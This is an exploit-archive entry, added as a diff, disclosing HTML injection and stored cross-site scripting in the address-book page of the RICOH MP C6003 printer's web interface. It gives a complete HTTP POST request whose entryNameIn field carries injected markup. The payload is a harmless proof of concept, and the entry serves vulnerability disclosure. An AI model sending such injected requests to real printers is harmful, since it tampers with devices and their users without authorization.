@@ -1,0 +1,31 @@
+# Exploit Title: RICOH MP C6003 Printer - Cross-Site Scripting
+# Date: 2018-09-21 
+# Exploit Author: Ismail Tasdelen
+# Vendor Homepage: https://www.ricoh.com/
+# Hardware Link: https://www.ricoh-usa.com/en/products/pd/equipment/printers-and-copiers/multifunction-printers-copiers/mp-c6003-color-laser-multifunction-printer/_/R-416534
+# Software: RICOH Printer
+# Product Version:  MP C6003
+# Vulernability Type: Code Injection
+# Vulenrability: HTML Injection and Stored XSS
+# CVE: N/A
+
+# On the RICOH MP C6003 printer, HTML Injection and Stored XSS vulnerabilities have been 
+# discovered in the area of adding addresses via the entryNameIn parameter 
+# to /web/entry/en/address/adrsSetUserWizard.cgi.
+
+# HTTP POST Request :
+
+POST /web/entry/en/address/adrsSetUserWizard.cgi HTTP/1.1
+Host: TARGET
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0
+Accept: text/plain, */*
+Accept-Language: tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Referer: http://TARGET/web/entry/en/address/adrsList.cgi
+Content-Type: application/x-www-form-urlencoded
+X-Requested-With: XMLHttpRequest
+Content-Length: 191
+Cookie: risessionid=136092287407915; cookieOnOffChecker=on; wimsesid=201698077
+Connection: close
+
+mode=ADDUSER&step=BASE&wimToken=71325138&entryIndexIn=00031&entryNameIn=%22%3E%3Ch1%3EIsmail%3C%2Fh1%3E&entryDisplayNameIn=&entryTagInfoIn=1&entryTagInfoIn=1&entryTagInfoIn=1&entryTagInfoIn=1
